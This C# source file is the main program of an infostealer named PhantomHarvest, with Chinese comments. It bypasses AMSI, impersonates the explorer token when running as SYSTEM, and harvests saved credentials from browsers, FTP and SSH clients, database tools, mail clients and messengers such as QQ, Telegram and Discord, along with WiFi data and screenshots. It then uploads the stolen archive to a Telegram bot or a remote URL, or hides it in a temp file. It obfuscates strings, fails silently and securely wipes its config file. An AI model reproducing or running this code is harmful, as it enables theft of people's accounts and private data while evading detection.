using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using PhantomHarvest.Browsers;
using PhantomHarvest.FTPs;
using PhantomHarvest.Helper;
using PhantomHarvest.Mails;
using PhantomHarvest.Messengers;
using PhantomHarvest.Softwares;
using PhantomHarvest.SystemInfos;
using PhantomHarvest.Tools;

namespace PhantomHarvest
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		private static void Main(string[] args)
		{
			try
			{
				// 1. 绕过 AMSI
				SecurityPatch.Patch();
				
				// 2. 解析参数
				bool saveMode = false;
				string password = null;
				string remoteUrl = null;
				
				for (int i = 0; i < args.Length; i++)
				{
					if (args[i] == "--save" && i + 1 < args.Length)
					{
						saveMode = true;
						password = args[i + 1];
					}
					else if (args[i] == "--remote" && i + 1 < args.Length)
					{
						remoteUrl = args[i + 1];
					}
					else if (args[i] == "--telegram" && i + 2 < args.Length)
					{
						string token = args[i + 1];
						string chatId = args[i + 2];
						remoteUrl = "https://api.telegram.org/bot" + token + "/sendDocument?chat_id=" + chatId;
						// Skip an extra arg since we consumed 2
						i++;
					}
					else if (args[i] == "--config" && i + 1 < args.Length)
					{
						string configPath = args[i + 1];
						if (File.Exists(configPath))
						{
							remoteUrl = ReadConfigFile(configPath);
							
							// Check for --unlink in other args
							bool unlink = false;
							foreach (string arg in args) if (arg == "--unlink") unlink = true;
							
							if (unlink && !string.IsNullOrEmpty(remoteUrl))
							{
								SecureDelete(configPath);
							}
						}
						else
						{
							Console.WriteLine("Config file not found: " + configPath);
						}
					}
				}
				
				if (!saveMode && string.IsNullOrEmpty(remoteUrl))
				{
					return;
				}
				
				// 3. 提权 (如果是 SYSTEM)
				// "system" -> icin\x7Fw
				if (Environment.UserName.ToLower() == StringHelper.D("icin\x7Fw"))
				{
					foreach (Process process in Process.GetProcesses())
					{
						// "explorer" -> \x7Fbjvuh\x7Fh
						if (process.ProcessName.ToLower() == StringHelper.D("\x7Fbjvuh\x7Fh") && Methods.ImpersonateProcessToken(process.Id))
						{
							break;
						}
					}
				}
				
				// 4. 收集数据
				byte[] exfilData = CollectAll();
				
				// 5. 渗出或保存
				if (saveMode)
				{
					// 隐蔽保存：使用随机文件名和扩展名，保存在临时目录
					string stealthPath = GenerateStealthyPath();
					CreatePasswordProtectedZip(exfilData, stealthPath, password);
					
					Console.ForegroundColor = ConsoleColor.Green;
					Console.WriteLine("Data saved to: " + stealthPath);
					Console.ResetColor();
					Console.Out.Flush();
				}
				else if (!string.IsNullOrEmpty(remoteUrl))
				{
					// "harvest_" -> r{hl\x7FinE
					string fileName = StringHelper.D("r{hl\x7FinE") + Environment.MachineName + "_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".zip";
					NetSender.SendFile(exfilData, fileName, remoteUrl);
				}
			}
			catch
			{
				// Silent failure
			}
			finally
			{
				try { Win32Api.RevertToSelf(); } catch { }
			}
		}
		
		private static byte[] CollectAll()
		{
			using (MemoryStream zipStream = new MemoryStream())
			{
				using (ArchiveManager zip = ArchiveManager.Create(zipStream, "", true))
				{
					List<System.Threading.Tasks.Task> tasks = new List<System.Threading.Tasks.Task>();
					
					// Browsers - 每个任务最长15秒超时
					tasks.Add(SafeCollectWithTimeout(() => BrowserHost.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => FireFox.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => IE.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => OldSogou.Collect(zip), 15000));
					
					// FTPs
					tasks.Add(SafeCollectWithTimeout(() => WinSCP.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => FileZilla.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => CoreFTP.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => Snowflake.Collect(zip), 15000));
					
					// Tools
					tasks.Add(SafeCollectWithTimeout(() => MobaXterm.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => Xmanager.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => Navicat.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => RDCMan.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => FinalShell.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => SQLyog.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => DBeaver.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => TortoiseSVN.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => SecureCRT.Collect(zip), 15000));
					
					// Mails
					tasks.Add(SafeCollectWithTimeout(() => MailMaster.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => Foxmail.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => Outlook.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => MailBird.Collect(zip), 15000));
					
					// Messengers
					tasks.Add(SafeCollectWithTimeout(() => QQ.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => Telegram.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => Skype.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => Enigma.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => DingTalk.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => Line.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => Discord.Collect(zip), 15000));
					
					// Softwares
					tasks.Add(SafeCollectWithTimeout(() => VSCode.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => NeteaseCloudMusic.Collect(zip), 15000));
					
					// SystemInfos
					tasks.Add(SafeCollectWithTimeout(() => Wifi.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => ScreenShot.Collect(zip), 15000));
					tasks.Add(SafeCollectWithTimeout(() => InstalledApp.Collect(zip), 15000));
					
					// 等待所有任务完成，最长 60 秒总超时
					System.Threading.Tasks.Task.WaitAll(tasks.ToArray(), 60000);
				}
				
				return zipStream.ToArray();
			}
		}
		
		/// <summary>
		/// 带超时的安全收集包装器 - 防止单个任务卡死
		/// </summary>
		private static System.Threading.Tasks.Task SafeCollectWithTimeout(Action action, int timeoutMs)
		{
			return System.Threading.Tasks.Task.Run(() =>
			{
				try
				{
					// 创建一个取消令牌源
					var cts = new System.Threading.CancellationTokenSource();
					var task = System.Threading.Tasks.Task.Run(action, cts.Token);
					
					// 等待任务完成或超时
					if (!task.Wait(timeoutMs))
					{
						// 超时：取消任务
						cts.Cancel();
						// 静默失败，不影响其他任务
					}
				}
				catch
				{
					// 静默失败，不影响其他任务
				}
			});
		}
		
		private static void SafeCollect(Action action)
		{
			try { action(); } catch { }
		}
		
		private static string GenerateStealthyPath()
		{
			// 随机扩展名，伪装成系统文件或日志
			string[] extensions = { ".dat", ".log", ".tmp", ".bin", ".sys", ".ini" };
			Random rand = new Random();
			string ext = extensions[rand.Next(extensions.Length)];
			
			// 随机文件名 (8-12位字母数字)
			string randomName = Guid.NewGuid().ToString("N").Substring(0, rand.Next(8, 13));
			
			// 优先选择临时目录
			string tempPath = Path.GetTempPath();
			
			return Path.Combine(tempPath, randomName + ext);
		}
		
		private static void CreatePasswordProtectedZip(byte[] data, string fileName, string password)
		{
			try
			{
				using (FileStream fs = new FileStream(fileName, FileMode.Create))
				using (ArchiveManager zip = ArchiveManager.Create(fs, "", false))
				{
					zip.SetPassword(password);
					using (MemoryStream ms = new MemoryStream(data))
					{
						// "data.bin" -> ~{n{4xst
						zip.AddStream(ArchiveManager.Compression.Deflate, StringHelper.D("~{n{4xst"), ms, DateTime.Now, "");
					}
				}
			}
			catch { }
		}
		private static string ReadConfigFile(string path)
		{
			try
			{
				Console.WriteLine("Reading config file: " + path);
				string[] lines = File.ReadAllLines(path);
				string token = null;
				string chatId = null;
				string url = null;
				
				foreach (string line in lines)
				{
					string l = line.Trim();
					// Console.WriteLine("Line: " + l);
					if (l.StartsWith("Token=")) token = l.Substring(6).Trim();
					if (l.StartsWith("ChatID=")) chatId = l.Substring(7).Trim();
					if (l.StartsWith("URL=")) url = l.Substring(4).Trim();
				}
				
				if (!string.IsNullOrEmpty(token)) Console.WriteLine("Found Token: " + token.Substring(0, 5) + "...");
				if (!string.IsNullOrEmpty(chatId)) Console.WriteLine("Found ChatID: " + chatId);
				
				if (!string.IsNullOrEmpty(token) && !string.IsNullOrEmpty(chatId))
				{
					string finalUrl = "https://api.telegram.org/bot" + token + "/sendDocument?chat_id=" + chatId;
					Console.WriteLine("Constructed URL: " + finalUrl);
					return finalUrl;
				}
				
				if (!string.IsNullOrEmpty(url)) Console.WriteLine("Found URL: " + url);
				return url;
			}
			catch (Exception ex)
			{ 
				Console.WriteLine("Error reading config: " + ex.Message);
				return null; 
			}
		}
		
		private static void SecureDelete(string path)
		{
			try
			{
				if (File.Exists(path))
				{
					// 覆盖文件内容 (3次覆盖以确保安全)
					long length = new FileInfo(path).Length;
					using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Write))
					{
						byte[] zeros = new byte[length];
						byte[] ones = new byte[length];
						byte[] random = new byte[length];
						new Random().NextBytes(random);
						for (int i = 0; i < length; i++) ones[i] = 0xFF;
						
						fs.Write(zeros, 0, (int)length);
						fs.Position = 0;
						fs.Write(ones, 0, (int)length);
						fs.Position = 0;
						fs.Write(random, 0, (int)length);
					}
					File.Delete(path);
				}
			}
			catch { }
		}
	}
}
